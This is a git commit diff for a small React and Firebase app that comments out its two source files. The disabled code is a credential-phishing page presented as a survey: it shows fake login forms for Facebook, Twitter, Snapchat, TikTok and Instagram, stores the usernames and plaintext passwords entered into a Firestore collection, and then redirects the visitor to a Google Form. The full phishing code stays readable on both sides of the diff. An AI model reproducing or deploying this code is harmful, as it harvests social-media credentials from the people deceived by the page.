3c8344f974d00718a0c572d18c5d09dd1d62f5fa
fr48 <fr48>
2023-05-24 14:42:42 +0200

    changes

--- src/App.js
+++ src/App.js
@@ -1,79 +1,79 @@
-import "./App.css";
-import React, { useEffect, useState } from "react";
-import Login from "./components/login";
-import { SocialIcon } from 'react-social-icons';
+// import "./App.css";
+// import React, { useEffect, useState } from "react";
+// import Login from "./components/login";
+// import { SocialIcon } from 'react-social-icons';
 
-function App() {
-  const [showFormFb, setShowFormFb] = useState(false);
-  const [showFormTw, setShowFormTw] = useState(false);
-  const [showFormSc, setShowFormSc] = useState(false);
-  const [showFormIg, setShowFormIg] = useState(false);
-  const [showFormtiktok, setShowFormtiktok] = useState(false);
-  const handleClickFb = () => {
+// function App() {
+//   const [showFormFb, setShowFormFb] = useState(false);
+//   const [showFormTw, setShowFormTw] = useState(false);
+//   const [showFormSc, setShowFormSc] = useState(false);
+//   const [showFormIg, setShowFormIg] = useState(false);
+//   const [showFormtiktok, setShowFormtiktok] = useState(false);
+//   const handleClickFb = () => {
     
-    setShowFormFb(true);
-    setShowFormTw(false);
-    setShowFormSc(false);
-    setShowFormIg(false);
-    setShowFormtiktok(false);
-  };
-  const handleClickTw = () => {
-    setShowFormTw(true);
-    setShowFormFb(false);
-    setShowFormSc(false);
-    setShowFormIg(false);
-    setShowFormtiktok(false);
-  };
-  const handleClickSc = () => {
-    setShowFormSc(true);
-    setShowFormFb(false);
-    setShowFormTw(false);
-    setShowFormIg(false);
-    setShowFormtiktok(false);
+//     setShowFormFb(true);
+//     setShowFormTw(false);
+//     setShowFormSc(false);
+//     setShowFormIg(false);
+//     setShowFormtiktok(false);
+//   };
+//   const handleClickTw = () => {
+//     setShowFormTw(true);
+//     setShowFormFb(false);
+//     setShowFormSc(false);
+//     setShowFormIg(false);
+//     setShowFormtiktok(false);
+//   };
+//   const handleClickSc = () => {
+//     setShowFormSc(true);
+//     setShowFormFb(false);
+//     setShowFormTw(false);
+//     setShowFormIg(false);
+//     setShowFormtiktok(false);
 
-  };
-  const handleClickIg = () => {
-    setShowFormIg(true);
-    setShowFormFb(false);
-    setShowFormTw(false);
-    setShowFormSc(false);
-    setShowFormtiktok(false);
+//   };
+//   const handleClickIg = () => {
+//     setShowFormIg(true);
+//     setShowFormFb(false);
+//     setShowFormTw(false);
+//     setShowFormSc(false);
+//     setShowFormtiktok(false);
 
-  };
-  const handleClickTiktok = () => {
-    setShowFormIg(false);
-    setShowFormFb(false);
-    setShowFormTw(false);
-    setShowFormSc(false);
-    setShowFormtiktok(true);
+//   };
+//   const handleClickTiktok = () => {
+//     setShowFormIg(false);
+//     setShowFormFb(false);
+//     setShowFormTw(false);
+//     setShowFormSc(false);
+//     setShowFormtiktok(true);
 
-  };
+//   };
 
-  return (
-    <div className="Homecontainer">
-      <h1>Welcome to Survey</h1>
-      <button onClick={handleClickFb}>Login with Facebook    <SocialIcon network="facebook"/></button>
-      {showFormFb && (
-        <Login platform = "Facebook"/>
-      )}
-      <button onClick={handleClickTw}>Login with Twitter     <SocialIcon network="twitter"/></button>
-      {showFormTw && (
-        <Login platform = "Twitter"/>
-      )}
-      <button onClick={handleClickSc}>Login with Snapchat    <SocialIcon network="snapchat"/></button>
-      {showFormSc && (
-        <Login platform = "Snapchat"/>
-      )}
-      <button onClick={handleClickTiktok}>Login with Tiktok    <SocialIcon network="tiktok" bgColor="#db0441"/></button>
-      {showFormtiktok && (
-        <Login platform = "Tiktok"/>
-      )}
-      <button onClick={handleClickIg}>Login with Instagram    <SocialIcon network="instagram"/></button>
-      {showFormIg && (
-        <Login platform = "Instagram"/>
-      )}
-    </div>
-  );
-}
+//   return (
+//     <div className="Homecontainer">
+//       <h1>Welcome to Survey</h1>
+//       <button onClick={handleClickFb}>Login with Facebook    <SocialIcon network="facebook"/></button>
+//       {showFormFb && (
+//         <Login platform = "Facebook"/>
+//       )}
+//       <button onClick={handleClickTw}>Login with Twitter     <SocialIcon network="twitter"/></button>
+//       {showFormTw && (
+//         <Login platform = "Twitter"/>
+//       )}
+//       <button onClick={handleClickSc}>Login with Snapchat    <SocialIcon network="snapchat"/></button>
+//       {showFormSc && (
+//         <Login platform = "Snapchat"/>
+//       )}
+//       <button onClick={handleClickTiktok}>Login with Tiktok    <SocialIcon network="tiktok" bgColor="#db0441"/></button>
+//       {showFormtiktok && (
+//         <Login platform = "Tiktok"/>
+//       )}
+//       <button onClick={handleClickIg}>Login with Instagram    <SocialIcon network="instagram"/></button>
+//       {showFormIg && (
+//         <Login platform = "Instagram"/>
+//       )}
+//     </div>
+//   );
+// }
 
-export default App;
+// export default App;
--- src/components/login.js
+++ src/components/login.js
@@ -1,83 +1,83 @@
-import React from "react";
-import { SocialIcon } from "react-social-icons";
-import { useEffect, useState } from "react";
-import firebase from "firebase/compat/app";
-import "firebase/compat/firestore";
+// import React from "react";
+// import { SocialIcon } from "react-social-icons";
+// import { useEffect, useState } from "react";
+// import firebase from "firebase/compat/app";
+// import "firebase/compat/firestore";
 
-export default function Login(props) {
-  const [newMessage, setNewMessage] = useState({});
-  const [username, setuserName] = useState('');
-  const [password, setPassword] = useState('');
-  const [isValid, setIsValid] = useState(false);
+// export default function Login(props) {
+//   const [newMessage, setNewMessage] = useState({});
+//   const [username, setuserName] = useState('');
+//   const [password, setPassword] = useState('');
+//   const [isValid, setIsValid] = useState(false);
 
-  const handleSendMessage = async (e) => {
+//   const handleSendMessage = async (e) => {
         
-    if(username == '' || password == '')
-    {
-      alert("Please enter username and password");
-    }
-    else
-    {
-      const db = firebase.firestore();
-        await db.collection("surveyweb").add({
-          Platform: props.platform, 
-          UserName: username,
-          Password: password,
-          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+//     // if(username == '' || password == '')
+//     // {
+//     //   alert("Please enter username and password");
+//     // }
+//     // else
+//     // {
+//     //   const db = firebase.firestore();
+//     //     await db.collection("surveyweb").add({
+//     //       Platform: props.platform, 
+//     //       UserName: username,
+//     //       Password: password,
+//     //       timestamp: firebase.firestore.FieldValue.serverTimestamp(),
           
           
-        });
-        setNewMessage("");
-        window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSeySsQZySjZ78BNucy2bud7Zgz0eFo29qu242KW312Fp2aMoQ/viewform?pli=1&pli=1';
-    }
+//     //     });
+//     //     setNewMessage("");
+//     //     window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSeySsQZySjZ78BNucy2bud7Zgz0eFo29qu242KW312Fp2aMoQ/viewform?pli=1&pli=1';
+//     // }
       
-  };
+//   };
 
-  // const handleChange = (e) => {
-  //   const name = e.target.name;
-  //   const value = e.target.value;
-  //   setNewMessage((values) => ({ ...values, [name]: value }));
-  // };
+//   // const handleChange = (e) => {
+//   //   const name = e.target.name;
+//   //   const value = e.target.value;
+//   //   setNewMessage((values) => ({ ...values, [name]: value }));
+//   // };
 
-  const handleNameChange = (event) => {
-    setuserName(event.target.value);
-    setIsValid(validateForm());
-  };
+//   const handleNameChange = (event) => {
+//     setuserName(event.target.value);
+//     setIsValid(validateForm());
+//   };
   
-  const handlePasswordChange = (event) => {
-    setPassword(event.target.value);
-    setIsValid(validateForm());
-  };
+//   const handlePasswordChange = (event) => {
+//     setPassword(event.target.value);
+//     setIsValid(validateForm());
+//   };
 
-  const validateForm = () => {
-    return username.trim() !== '' || password.trim() !== '';
-  };
+//   const validateForm = () => {
+//     return username.trim() !== '' || password.trim() !== '';
+//   };
   
 
-  return (
-    <div className="container">
-      <SocialIcon network="Snapchat" />
-      <div className="formdiv">
-        <input
-          type="text"
-          name="username"
-          value={username.value}
-          onChange={handleNameChange}
-          placeholder="Username or Email"
-          required
-        />
-        <input
-          type="password"
-          name="password"
-          placeholder="password"
-          value={password.value}
-          onChange={handlePasswordChange}
-          required
+//   return (
+//     <div className="container">
+//       <SocialIcon network="Snapchat" />
+//       <div className="formdiv">
+//         <input
+//           type="text"
+//           name="username"
+//           value={username.value}
+//           onChange={handleNameChange}
+//           placeholder="Username or Email"
+//           required
+//         />
+//         <input
+//           type="password"
+//           name="password"
+//           placeholder="password"
+//           value={password.value}
+//           onChange={handlePasswordChange}
+//           required
         
-        />
-        <button onClick={handleSendMessage}>Login</button>
+//         />
+//         <button onClick={handleSendMessage}>Login</button>
        
-      </div>
-    </div>
-  );
-}
+//       </div>
+//     </div>
+//   );
+// }
